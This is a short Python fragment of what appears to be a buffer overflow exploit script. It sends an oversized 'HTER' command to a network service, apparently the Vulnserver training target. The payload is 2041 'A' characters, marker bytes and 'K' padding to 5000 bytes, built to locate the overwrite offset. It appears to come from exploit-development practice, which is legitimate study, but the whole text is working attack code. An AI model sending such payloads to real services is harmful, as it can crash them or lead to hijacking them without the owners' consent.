data=s.recv(1024)
#custom pattern of   lenght 4000 with 12345ABCDEF charecters 
pattern=""
#pattern="A"*2200
pattern="A"*2041+"BCDEFBCD"
pad= 5000-len(pattern)
pattern=pattern+"K"*pad
buffer="HTER "+pattern+"\r\n\r\n"


print(buffer)
s.send(buffer)
data=s.recv(1024)
print(data+str(len(buffer)))
